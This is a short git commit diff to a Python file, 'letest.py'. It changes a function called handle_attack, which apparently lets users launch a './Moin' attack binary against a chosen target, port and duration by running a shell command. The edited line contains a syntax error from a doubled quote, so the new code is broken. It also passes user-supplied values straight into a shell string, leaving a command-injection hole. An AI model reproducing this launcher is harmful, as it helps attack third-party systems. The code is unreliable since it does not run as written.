2c7b6a357e9db503239b1d0212a3eaf30bcaf64c
srkyt555 <ghub55501@gmail.com>
2025-03-04 10:15:23 +0530

    Update letest.py

--- letest.py
+++ letest.py
@@ -165,7 +165,7 @@ def handle_attack(message):
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./Moin {target} {port} {time}"
+    full_command = f""./Moin {target} {port} {time_duration}"
 
     try:
         subprocess.run(full_command, shell=True, check=True)
